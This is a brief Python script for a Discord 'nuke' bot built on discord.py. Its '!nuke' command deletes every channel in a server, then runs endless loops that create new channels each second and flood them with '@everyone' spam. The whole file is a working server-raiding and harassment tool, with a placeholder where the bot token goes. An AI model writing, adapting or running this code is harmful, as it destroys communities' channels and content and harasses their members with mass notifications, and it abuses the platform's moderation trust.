import discord; from discord.ext import commands; import asyncio; bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
@bot.command()
async def nuke(ctx, count: int):
    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels],*[main(ctx.guild) for _ in range(count)])
async def main(guild):
    while True: await (await guild.create_text_channel("Goofy asf tbh")).send("Goofy asf @everyone"); await asyncio.sleep(1)
bot.run("YOUR BOT TOKEN HERE")
